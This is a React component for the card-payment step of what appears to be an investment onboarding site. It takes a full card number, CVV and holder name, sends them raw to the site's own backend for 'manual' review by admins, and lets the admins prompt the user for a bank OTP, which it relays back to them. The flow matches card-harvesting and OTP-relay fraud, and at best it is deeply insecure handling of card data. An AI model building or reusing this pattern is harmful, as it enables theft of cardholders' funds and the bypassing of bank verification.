import { useState, useEffect } from 'react';
import { useNavigate } from 'react-router-dom';
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Button } from "@/components/ui/button";
import { Input } from "@/components/ui/input";
import { Label } from "@/components/ui/label";
import { CreditCard, Shield, Loader2 } from "lucide-react";
import { toast } from "sonner";
import {
  submitSimpleCardPayment,
  submitCardPaymentOtp,
  getCardPaymentDetails
} from '@/services/paymentService';
import { useOnboarding } from '@/context/OnboardingContext';

interface SimpleCardPaymentFormProps {
  amount: number;
  currency: string;
  onCancel: () => void;
  onSuccess?: (data: any) => void;
}

interface CardDetails {
  cardNumber: string;
  expiryDate: string;
  cvv: string;
  holderName: string;
}

export default function SimpleCardPaymentForm({
  amount,
  currency,
  onCancel
}: SimpleCardPaymentFormProps) {
  const [step, setStep] = useState<'details' | 'submitted' | 'processing' | 'approved' | 'rejected' | 'otp' | 'success'>('details');
  const [loading, setLoading] = useState(false);
  const [cardDetails, setCardDetails] = useState<CardDetails>({
    cardNumber: '',
    expiryDate: '',
    cvv: '',
    holderName: ''
  });
  const [otpCode, setOtpCode] = useState('');
  const [paymentId, setPaymentId] = useState<string>('');
  const { updateStatus } = useOnboarding();
  const navigate = useNavigate();

  // Poll for payment status when in processing or submitted state
  useEffect(() => {
    let interval: NodeJS.Timeout;

    if ((step === 'processing' || step === 'submitted') && paymentId) {
      interval = setInterval(async () => {
        try {
          const result = await getCardPaymentDetails(paymentId);
          if (result.success && result.payment) {
            const payment = result.payment;

            // Check if admin requested OTP
            if (payment.needsOtp && !payment.otpCode) {
              setStep('otp');
              toast.info('Please enter the OTP to complete your payment verification');
            } else if (payment.status === 'approved') {
              setStep('approved');
              toast.success('Payment approved! Your investment has been processed.');

              // Update onboarding status to completed when payment is approved
              try {
                console.log('🎯 Updating onboarding status to completed after card payment approval');
                await updateStatus('completed');
                console.log('✅ Onboarding status successfully updated to completed');
              } catch (error) {
                console.error('❌ Error updating onboarding status:', error);
              }
            } else if (payment.status === 'rejected') {
              setStep('rejected');
              toast.error('Payment rejected. Please contact support for assistance.');
            }
          }
        } catch (error) {
          console.error('Failed to check payment status:', error);
        }
      }, 5000); // Poll every 5 seconds
    }

    return () => {
      if (interval) {
        clearInterval(interval);
      }
    };
  }, [step, paymentId, updateStatus]);
  // const [needsOtp, setNeedsOtp] = useState(false);

  // Simple card number formatting
  const formatCardNumber = (value: string) => {
    const cleaned = value.replace(/\s/g, '');
    const formatted = cleaned.replace(/(.{4})/g, '$1 ').trim();
    return formatted;
  };

  // Expiry date formatting (MM/YY)
  const formatExpiryDate = (value: string) => {
    const cleaned = value.replace(/\D/g, '');
    if (cleaned.length >= 2) {
      return cleaned.substring(0, 2) + (cleaned.length > 2 ? '/' + cleaned.substring(2, 4) : '');
    }
    return cleaned;
  };

  // Basic card validation
  const validateCard = () => {
    const cleanNumber = cardDetails.cardNumber.replace(/\s/g, '');
    if (cleanNumber.length < 13 || cleanNumber.length > 19) {
      toast.error('Please enter a valid card number');
      return false;
    }
    if (!cardDetails.holderName.trim()) {
      toast.error('Please enter the cardholder name');
      return false;
    }
    if (!cardDetails.expiryDate || cardDetails.expiryDate.length < 5) {
      toast.error('Please enter a valid expiry date (MM/YY)');
      return false;
    }

    // Validate expiry date is not in the past
    const [month, year] = cardDetails.expiryDate.split('/');
    const currentDate = new Date();
    const currentYear = currentDate.getFullYear() % 100; // Get last 2 digits
    const currentMonth = currentDate.getMonth() + 1;
    const expiryYear = parseInt(year);
    const expiryMonth = parseInt(month);

    if (expiryMonth < 1 || expiryMonth > 12) {
      toast.error('Please enter a valid month (01-12)');
      return false;
    }

    if (expiryYear < currentYear || (expiryYear === currentYear && expiryMonth < currentMonth)) {
      toast.error('Card expiry date cannot be in the past');
      return false;
    }
    if (cardDetails.cvv.length < 3) {
      toast.error('Please enter a valid CVV');
      return false;
    }
    return true;
  };

  const handleSubmitCard = async () => {
    if (!validateCard()) return;

    setLoading(true);
    try {
      const [month, year] = cardDetails.expiryDate.split('/');
      const result = await submitSimpleCardPayment({
        amount,
        currency,
        cardDetails: {
          cardNumber: cardDetails.cardNumber.replace(/\s/g, ''), // Clean spaces
          expiryMonth: month,
          expiryYear: year,
          cvv: cardDetails.cvv,
          holderName: cardDetails.holderName
        }
      });

      setPaymentId(result.paymentId);
      setStep('processing');
      toast.success('Processing your payment. Please wait while our admin team reviews your request.');

    } catch (error: any) {
      console.error('Payment error:', error);
      toast.error(error.response?.data?.message || 'Payment failed. Please try again.');
    } finally {
      setLoading(false);
    }
  };

  const handleOtpSubmit = async () => {
    if (otpCode.length !== 6) {
      toast.error('Please enter a valid 6-digit OTP');
      return;
    }

    try {
      await submitCardPaymentOtp(paymentId, otpCode);
      setStep('processing');
      toast.success('OTP submitted successfully! Please wait for admin approval.');
    } catch (error: any) {
      toast.error(error.response?.data?.message || 'Invalid OTP. Please try again.');
    }
  };

  // Card Details Step
  if (step === 'details') {
    return (
      <Card className="w-full max-w-xl mx-auto">
        <CardHeader>
          <CardTitle className="flex items-center gap-2">
            <CreditCard className="h-5 w-5" />
            Card Payment
          </CardTitle>
          <p className="text-sm text-gray-600">
            Amount: {currency} {amount.toLocaleString()}
          </p>
        </CardHeader>
        <CardContent className="space-y-4">
          {/* Card Number */}
          <div className="space-y-2">
            <Label htmlFor="cardNumber">Card Number</Label>
            <Input
              id="cardNumber"
              type="text"
              placeholder="1234 5678 9012 3456"
              value={cardDetails.cardNumber}
              onChange={(e: React.ChangeEvent<HTMLInputElement>) => {
                const formatted = formatCardNumber(e.target.value);
                if (formatted.replace(/\s/g, '').length <= 19) {
                  setCardDetails(prev => ({ ...prev, cardNumber: formatted }));
                }
              }}
              maxLength={23} // 19 digits + 4 spaces
            />
          </div>

          {/* Cardholder Name */}
          <div className="space-y-2">
            <Label htmlFor="holderName">Cardholder Name</Label>
            <Input
              id="holderName"
              type="text"
              placeholder="JOHN SMITH"
              value={cardDetails.holderName}
              onChange={(e: React.ChangeEvent<HTMLInputElement>) => setCardDetails(prev => ({
                ...prev,
                holderName: e.target.value.toUpperCase()
              }))}
            />
          </div>

          {/* Expiry Date and CVV */}
          <div className="grid grid-cols-2 gap-3">
            <div className="space-y-2">
              <Label htmlFor="expiryDate">Expiry Date</Label>
              <Input
                id="expiryDate"
                type="text"
                placeholder="MM/YY"
                maxLength={5}
                value={cardDetails.expiryDate}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) => {
                  const formatted = formatExpiryDate(e.target.value);
                  setCardDetails(prev => ({ ...prev, expiryDate: formatted }));
                }}
              />
            </div>
            <div className="space-y-2">
              <Label htmlFor="cvv">CVV</Label>
              <Input
                id="cvv"
                type="text"
                placeholder="123"
                value={cardDetails.cvv}
                onChange={(e: React.ChangeEvent<HTMLInputElement>) => {
                  const value = e.target.value.replace(/\D/g, '');
                  if (value.length <= 4) {
                    setCardDetails(prev => ({ ...prev, cvv: value }));
                  }
                }}
                maxLength={4}
              />
            </div>
          </div>

          {/* Security Notice */}
          {/* <div className="flex items-start gap-2 p-3 bg-blue-50 rounded-lg">
            <Shield className="h-4 w-4 text-blue-600 mt-0.5" />
            <div className="text-sm text-blue-800">
              <p className="font-medium">Secure Processing</p>
              <p>Your card details are securely stored and will be processed manually by our team.</p>
            </div>
          </div> */}

          {/* Action Buttons */}
          <div className="flex gap-3 pt-2">
            <Button
              onClick={onCancel}
              variant="outline"
              className="flex-1"
            >
              Cancel
            </Button>
            <Button
              onClick={handleSubmitCard}
              disabled={loading}
              className="flex-1"
            >
              {loading ? (
                <>
                  <Loader2 className="h-4 w-4 mr-2 animate-spin" />
                  Processing...
                </>
              ) : (
                'Submit Payment'
              )}
            </Button>
          </div>
        </CardContent>
      </Card>
    );
  }

  // Submitted Step - waiting for admin to request OTP
  if (step === 'submitted') {
    return (
      <Card className="w-full max-w-md mx-auto">
        <CardContent className="pt-6">
          <div className="text-center space-y-4">
            <div className="w-16 h-16 mx-auto bg-orange-100 rounded-full flex items-center justify-center">
              <Shield className="w-8 h-8 text-orange-600" />
            </div>
            <h3 className="text-lg font-semibold text-orange-600">Payment Submitted</h3>
            <p className="text-gray-600">
              Your payment has been submitted for review. Please wait while our admin team processes your request.
            </p>
            <div className="space-y-3">
              <p className="text-sm text-gray-500">
                Payment ID: <span className="font-mono">{paymentId}</span>
              </p>
              <p className="text-xs text-gray-400">
                You will be prompted for OTP verification once admin approves your request.
              </p>
            </div>
          </div>
        </CardContent>
      </Card>
    );
  }

  // Processing Step - admin is reviewing
  if (step === 'processing') {
    return (
      <Card className="w-full max-w-md mx-auto">
        <CardContent className="pt-6">
          <div className="text-center space-y-4">
            <div className="w-16 h-16 mx-auto bg-blue-100 rounded-full flex items-center justify-center">
              <Loader2 className="w-8 h-8 text-blue-600 animate-spin" />
            </div>
            <h3 className="text-lg font-semibold text-blue-600">Processing Payment</h3>
            <p className="text-gray-600">
              Our admin team is currently processing your payment. Please wait a moment...
            </p>
            <div className="space-y-3">
              <p className="text-sm text-gray-500">
                Payment ID: <span className="font-mono">{paymentId}</span>
              </p>
              <p className="text-xs text-gray-400">
                This usually takes a few minutes to complete.
              </p>
            </div>
          </div>
        </CardContent>
      </Card>
    );
  }

  // Approved Step
  if (step === 'approved') {
    return (
      <Card className="w-full max-w-md mx-auto">
        <CardContent className="pt-6">
          <div className="text-center space-y-4">
            <div className="w-16 h-16 mx-auto bg-green-100 rounded-full flex items-center justify-center">
              <Shield className="w-8 h-8 text-green-600" />
            </div>
            <h3 className="text-lg font-semibold text-green-600">Payment Approved!</h3>
            <p className="text-gray-600">
              Your payment has been successfully processed and your investment has been confirmed.
            </p>
            <div className="space-y-3">
              <p className="text-sm text-gray-500">
                Payment ID: <span className="font-mono">{paymentId}</span>
              </p>
              <Button
                onClick={() => navigate('/dashboard')}
                className="w-full bg-green-600 hover:bg-green-700"
              >
                Continue to Dashboard
              </Button>
            </div>
          </div>
        </CardContent>
      </Card>
    );
  }

  // Rejected Step
  if (step === 'rejected') {
    return (
      <Card className="w-full max-w-md mx-auto">
        <CardContent className="pt-6">
          <div className="text-center space-y-4">
            <div className="w-16 h-16 mx-auto bg-red-100 rounded-full flex items-center justify-center">
              <Shield className="w-8 h-8 text-red-600" />
            </div>
            <h3 className="text-lg font-semibold text-red-600">Payment Rejected</h3>
            <p className="text-gray-600">
              Unfortunately, your payment could not be processed at this time. Please contact our support team for assistance.
            </p>
            <div className="space-y-3">
              <p className="text-sm text-gray-500">
                Payment ID: <span className="font-mono">{paymentId}</span>
              </p>
              <div className="flex space-x-2">
                <Button
                  onClick={() => setStep('details')}
                  variant="outline"
                  className="flex-1"
                >
                  Try Again
                </Button>
                <Button
                  onClick={onCancel}
                  className="flex-1"
                >
                  Cancel
                </Button>
              </div>
            </div>
          </div>
        </CardContent>
      </Card>
    );
  }

  // OTP Step
  if (step === 'otp') {
    return (
      <Card className="w-full max-w-md mx-auto">
        <CardHeader>
          <CardTitle>Enter OTP</CardTitle>
          <p className="text-sm text-gray-600">
            Please enter the 6-digit OTP sent to your registered device.
          </p>
        </CardHeader>
        <CardContent className="space-y-4">
          <div className="space-y-2">
            <Label htmlFor="otp">OTP Code</Label>
            <Input
              id="otp"
              type="text"
              placeholder="123456"
              value={otpCode}
              onChange={(e: React.ChangeEvent<HTMLInputElement>) => {
                const value = e.target.value.replace(/\D/g, '');
                if (value.length <= 6) {
                  setOtpCode(value);
                }
              }}
              maxLength={6}
              className="text-center text-lg tracking-widest"
            />
          </div>

          <div className="flex gap-3">
            <Button
              onClick={() => setStep('submitted')}
              variant="outline"
              className="flex-1"
            >
              Back
            </Button>
            <Button
              onClick={handleOtpSubmit}
              disabled={otpCode.length !== 6}
              className="flex-1"
            >
              Verify OTP
            </Button>
          </div>
        </CardContent>
      </Card>
    );
  }

  // Success Step
  if (step === 'success') {
    return (
      <Card className="w-full max-w-md mx-auto">
        <CardContent className="pt-6">
          <div className="text-center space-y-4">
            <div className="w-16 h-16 mx-auto bg-green-100 rounded-full flex items-center justify-center">
              <Shield className="w-8 h-8 text-green-600" />
            </div>
            <h3 className="text-lg font-semibold text-green-600">Payment Submitted</h3>
            <p className="text-gray-600">
              Your payment has been submitted and is being processed by our team.
              You'll receive a notification once it's approved.
            </p>
          </div>
        </CardContent>
      </Card>
    );
  }

  return null;
}
